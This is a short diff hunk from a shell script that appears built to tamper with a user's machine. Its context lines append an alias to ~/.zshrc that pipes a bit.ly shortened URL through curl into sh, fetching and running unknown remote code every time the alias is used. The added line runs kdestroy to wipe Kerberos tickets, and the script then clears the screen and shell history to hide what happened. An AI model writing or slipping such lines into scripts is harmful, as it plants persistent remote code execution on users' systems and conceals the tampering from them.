@@ -10,6 +10,7 @@ if [ `alias | grep spoody | wc -l` -eq 0 ]; then
   echo "alias spoody='curl -s -L bit.ly/spody | sh'" >> ~/.zshrc
 fi
 
+kdestroy
 clear
 history -c
 
